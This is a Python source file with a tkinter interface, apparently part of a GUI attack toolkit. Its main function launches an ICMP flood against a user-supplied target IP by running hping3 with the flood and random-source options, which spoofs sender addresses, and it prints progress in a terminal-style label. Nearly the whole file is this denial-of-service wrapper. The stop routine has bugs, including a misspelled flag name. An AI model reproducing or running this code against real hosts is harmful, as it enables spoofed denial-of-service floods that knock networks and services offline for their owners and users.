import threading
import traceback
import subprocess
import signal

from tkinter import *

def startIcmpAttack(targetIp, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global icmpAttackIsRunning, icmpAttackThreads, terminalLabel, errorOutputLabel

    icmpAttackIsRunning = False
    icmpAttackThreads = threading.Thread(target = lambda : sendIcmpPackets(targetIp))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running ICMP Flood Attack...\n\n"

    runIcmpAttack()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopIcmpAttack() :
    global icmpAttackThreads, icmpAttackIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping ICMP Flood Attack...\n\n"
        icmpAttackIsrunning = False
        icmpAttackThreads.join(0)
        icmpAttackThreads = None

        process.send_signal(signal.SIGINT)

        terminalLabel["text"] += "$ ICMP Flood Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runIcmpAttack() :
    global icmpAttackThreads, icmpAttackIsRunning
    icmpAttackIsRunning = True
    icmpAttackThreads.start()

def sendIcmpPackets(targetIP):
    global process
    terminalLabel["text"] += "$ Target IP : " + targetIP + "\n"
    process = subprocess.Popen(["hping3", "--icmp", "--flood", "--rand-source", targetIP])